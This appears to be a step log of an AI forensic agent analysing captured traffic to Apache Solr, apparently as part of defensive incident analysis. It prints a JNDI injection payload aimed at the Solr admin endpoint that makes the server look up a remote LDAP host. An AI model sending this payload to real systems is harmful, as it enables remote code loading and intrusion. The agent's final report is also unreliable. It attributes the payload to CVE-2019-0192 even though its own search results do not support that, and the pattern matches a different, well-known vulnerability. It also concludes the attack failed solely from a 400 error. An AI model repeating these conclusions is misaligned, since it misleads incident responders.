[Task 6]
Step 1: The PCAP summary indicates a TCP conversation between two IP addresses on port 8983. This port is commonly associated with Apache Solr, a popular open-source search platform. However, to confirm the service or application involved, I need to analyze the traffic further to identify any specific application signatures or protocols.

Next, I will extract HTTP requests and their headers from the PCAP file to verify if Apache Solr or another service is running on port 8983. This will help in identifying the service or application involved.
Step 2: Final report from the forensic expert:
The analysis of the PCAP file revealed an HTTP request to `localhost:8983` with the URI `/solr/admin/cores?action=$%7Bjndi:ldap://8qvsbr.sdasda1212.cn%7D`, indicating a potential exploitation attempt involving Apache Solr. The request suggests an attempt to perform a JNDI injection attack. Attempts to extract additional HTTP response headers, such as the `Server` field, resulted in no output, indicating that the server did not include this information in its responses or the service on port 8983 does not provide it.
Executed command: -Y "http.response" -T fields -e http.server

Command output: No output found for the given command.

Step 4: Stored memory 2c8d5c6a-6548-4acc-b83e-f8c2e87b9c13
Step 5: The analysis of the PCAP file has revealed a potential JNDI injection attack attempt on Apache Solr, as indicated by the HTTP request to `localhost:8983` with the URI `/solr/admin/cores?action=$%7Bjndi:ldap://8qvsbr.sdasda1212.cn%7D`. This suggests an attempt to exploit a vulnerability in Apache Solr. To proceed, I need to identify the relevant CVE associated with this type of attack on Apache Solr.

Next, I will perform a web search to find the CVE associated with JNDI injection attacks on Apache Solr.
Step 6: Search result for query: 'CVE JNDI injection Apache Solr'
Information 1: peration, so we can exploit it as an ordinary JNDI resolution attack. See our Exploiting JNDI Injections article for more information about JNDI attacks. Solr is based on Jetty, hence the Tomcat trick is not applicable here, but you can rely on remote classloading which was fixed for LDAP just quite recently. 4.

Information 2: way we trigger a deserialization attack with the known gadget chain based on the 'com.sun.rowset.JdbcRowSetImpl' class. It requires two setters to be called for 'jndiName' and 'autoCommit' properties and leads us to the vulnerable 'InitialContext.lookup' operation, so we can exploit it as an ordinary JNDI resolution attack. See our Exploiting JNDI Injections article for more information about JNDI attacks. Solr is based on Jetty, hence the Tomcat trick is not applicable here, but you can rely on remote clas

Step 7: Based on the web search results, it appears that the potential JNDI injection attack on Apache Solr is associated with CVE-2019-0192, which involves deserialization of untrusted data via the `jmx.serviceUrl`. This aligns with the observed behavior in the PCAP file, where a JNDI injection attempt was made.

Next, I need to gather evidence of malicious activities associated with this CVE from the PCAP file. I will instruct the "tshark_expert" to look for signs of deserialization attempts or any unusual JNDI-related traffic that could indicate exploitation attempts.
Step 8: Final report from the forensic expert:
The analysis focused on identifying JNDI-related traffic or deserialization attempts within the provided PCAP file. Initial attempts to detect LDAP and RMI traffic, which are commonly associated with JNDI lookups, yielded no results. Subsequently, an attempt was made to search for the string 'jndi' within the packet data. However, this attempt resulted in an error due to incorrect syntax. Despite efforts to consult the tshark manual for the correct syntax, no relevant information was found. As a result, the analysis could not conclusively identify any JNDI-related traffic or deserialization attempts in the PCAP file.
Executed command: -Y "frame contains 'jndi'"

Error in the command

Step 9: The analysis of the PCAP file has indicated a potential JNDI injection attack on Apache Solr, associated with CVE-2019-0192. However, the attempt to gather evidence of malicious activities related to this CVE from the PCAP file was inconclusive due to syntax errors in the command used to search for JNDI-related traffic.

To proceed, I need to reassess the approach to identify any signs of deserialization attempts or unusual JNDI-related traffic that could indicate exploitation attempts. I will instruct the "tshark_expert" to perform a more targeted analysis by looking for specific patterns or anomalies in the traffic that align with the characteristics of CVE-2019-0192.

Next, I will instruct the "tshark_expert" to search for any deserialization attempts or unusual JNDI-related traffic patterns in the PCAP file.
Step 10: Final report from the forensic expert:
The analysis of the PCAP file revealed a suspicious HTTP GET request to the Solr admin cores endpoint with a JNDI injection attempt: `GET /solr/admin/cores?action=${jndi:ldap://8qvsbr.sdasda1212.cn}`. This is indicative of a potential exploitation attempt related to CVE-2019-0192, as it involves a JNDI lookup using LDAP, which is a common vector for deserialization attacks. The HTTP response included a JSON error message indicating an unsupported operation involving an LDAP URL, further supporting the suspicion of an exploitation attempt.

Step 12: FINAL REPORT:
The analysis of the PCAP file revealed a suspicious HTTP GET request to the Solr admin cores endpoint with a JNDI injection attempt: `GET /solr/admin/cores?action=${jndi:ldap://8qvsbr.sdasda1212.cn}`. This is indicative of a potential exploitation attempt related to CVE-2019-0192, as it involves a JNDI lookup using LDAP, which is a common vector for deserialization attacks. The HTTP response included a JSON error message indicating an unsupported operation involving an LDAP URL, further supporting the suspicion of an exploitation attempt. However, the attack was not successful as the server returned a 400 Bad Request error, indicating that the operation was not executed.
